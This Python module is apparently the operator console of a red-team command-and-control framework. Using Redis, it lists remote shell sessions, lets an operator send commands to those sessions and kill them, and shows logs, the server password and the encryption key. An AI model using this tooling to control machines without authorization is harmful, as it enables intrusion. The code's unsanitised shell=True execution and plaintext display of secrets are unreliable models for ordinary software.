#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/client.py
"""

import os
import readline
import base64
import subprocess
from tabulate import tabulate
from core.autocomplete import Completer
from core.ui import UI
from core.utils import Utils
from core.log import Log
from core.alias import Alias
from core.sync import start_cmd_sync
from core.shell import Shell

class Cli:

    def __init__(self, config):
        self.cmds = dict()
        self.cmds["exit"] = self.exit_cli
        self.cmds["list"] = self.list_clients
        self.cmds["interact"] = self.interact
        self.cmds["show"] = self.view_event
        self.cmds["help"] = self.show_help
        self.cmds["kill"] = self.kill_shell
        self.cmds["purge"] = self.flushdb
        self.cmds["os"] = self.os_shell
        self.config = config
        self.db = self.config.get("redis")
        self._prompt = "Main"
        self.guid = ""
        self.alias = Alias()
        self.shell = Shell(self.db, True)
        self.completer = Completer(self.cmds)
        
        readline.parse_and_bind("tab:complete")
        readline.set_completer(self.completer.complete)
        start_cmd_sync(config)

    def set_prompt(self, prompt):
        self._prompt = prompt

    def prompt(self):
        return UI.prompt(self._prompt)

    def set_guid(self, guid):
        self.guid = guid

    def set_interact(self, guid):
        self.guid = guid

    def parse_cmd(self, data):
        cmd = data.split(" ", 1)[0].lower()
        if not self.guid == "":
            if cmd == "background":
                self._prompt = "Main"
                self.db.remove_active_user(self.config.get("uid"), self.guid)
                self.guid = ""
            elif cmd == "exit":
                UI.error("*** You really want to kill this shell *** (yes/no)")
                if UI.prompt("Exit").lower() == "yes":
                    self.db.push_cmd(self.guid, "exit", Utils.guid(), self.config.get("username"))
                    self._prompt = "Main"
                    self.guid = ""
            else:
                self.db.append_shell_data(self.guid, "[%s] %s - Sending command: \n%s\n\n" % (Utils.timestamp(), self.config.get("username"), data))
                Log.log_shell(self.guid, "- Sending command", data, self.config.get("username"))
                data = self.shell.evalute_cmd(data)
                print(data[0])
                
                if not (cmd == "help" or data[1] == ""):
                    self.db.push_cmd(self.guid, data[1], Utils.guid(),self.config.get("username"))
        else:
            # interacting with the main console
            if cmd in self.cmds:
                callback = self.cmds[cmd]
                callback(data)
            elif not cmd.strip() == "":
                UI.error("%s is not a valid command" % cmd)

    def exit_cli(self, data):
        os._exit(0)

    def list_clients(self, data):
        print("""List of active shells\n""" + "-" * 21 + "\n")
        for shell in self.db.get_all_shells():
            guid = shell.decode().split(":")[0]
            timestamp = self.db.get_data(shell)
            prompt = ""
            id = ""
            try:
                prompt = self.db.get_data("%s:prompt" % guid).decode()
                id = self.db.get_data("%s:id" % guid).decode()
            except:
                pass
            if not id == "":
                if Utils.get_arg_at(data, 1, 2) == "full":
                    print("  %s\t%s %s last seen %s" % (id, prompt, guid, timestamp.decode()))
                else:
                    print("  %s\t%s" % (id, prompt))

    def interact(self, data):
        current_id = Utils.get_arg_at(data, 1, 2)
        guid = ""
        for shell in self.db.get_all_shell_id():
            id = self.db.get_data(shell).decode()
            if current_id == id:
                guid = shell.decode().split(":")[0]
                break
        if not guid == "":
            self.completer = Completer(self.shell.get_cmd())
            readline.set_completer(self.completer.complete)
            readline.parse_and_bind("tab: complete")
            self.guid = guid
            self.db.add_active_user(self.config.get("uid"),self.guid)
            self._prompt = self.db.get_data("%s:prompt" % guid).decode()
        else:
            UI.error("Invalid session ID")

    def view_event(self, data):
        log_path = Utils.get_arg_at(data, 1, 2)
        if log_path == "":
            UI.error("Missing arguments")
            return

        if log_path == "key":
            UI.warn("Your encryption key is %s" % self.config.get("encryption-key"))
            return

        if log_path == "password":
            UI.warn("Your server password is %s" % self.config.get("server-password"))
            return

        if not log_path in ("http", "event", "error"):
            UI.error("Invalid path")
            return

        log_path += ".log"

        rows = Utils.get_arg_at(data, 2, 2)
        if rows == "":
            rows = 10
        else:
            try:
                rows = int(rows)
            except:
                rows = 10

        log_path = Log.get_current_path(log_path)
        data = []
        if Utils.file_exists(log_path):
            for line in open(log_path, "rb").readlines():
                data.append(line)
            data = list(reversed(data))
            print("""Last %d lines of log\n----------------------""" % rows)
            data = list(data)
            for i in range(0, rows):
                try:
                    print(data[i].decode().strip())
                except:
                    pass
                
    def flushdb(self, data):
        force = Utils.get_arg_at(data, 1, 1)
        if force:
            self.db.flushdb()
            UI.error("The whole redis DB was flushed")
        else:
            UI.error("Please use the force switch")

    def os_shell(self, data):
        cmd = Utils.get_arg_at(data, 1, 1)
        print("""Executing: %s\n----------------------""" % cmd)
        try:
            output = subprocess.check_output(cmd,stderr=subprocess.PIPE, shell=True)
        except:
            UI.error("Command failed to execute properly")
            output = bytearray()
        print(output.decode())
        
    def kill_shell(self, data):
        current_id = Utils.get_arg_at(data, 1, 2)
        guid = ""
        for shell in self.db.get_all_shell_id():
            id = self.db.get_data(shell).decode()
            if current_id == id:
                guid = shell.decode().split(":")[0]
                break
        if not guid == "":
            self.db.delete_all_by_guid(guid)
            print("Deleting shell with ID %s" % current_id)
        else:
            UI.error("Invalid session ID")
            
    def show_help(self, data):
        print("""Help Menu\n""" + "=" * 9)
        print("\n" + tabulate({"Commands": [
            "list","interact",
            "show",
            "kill",
            "os",
            "purge",
            "exit",
            "help",
            ],
            "Args": [
            "full",
            "id",
            "(password,key,error,http,event) rows",
            "id",
            "command",
            "force",
            "",
            "",
            ],
            "Descriptions": [
            "List all active shells",
            "Interact with a session",
            "Show server password, encryption key, errors, http or events log (default number of rows 10)",
            "kill shell (clear db only)",
            "Execute command on the system (local)",
            "WARNING! Delete all the Redis DB",
            "Exit the application",
            "Show this help menu",
            ]},
        headers="keys", tablefmt="simple"))
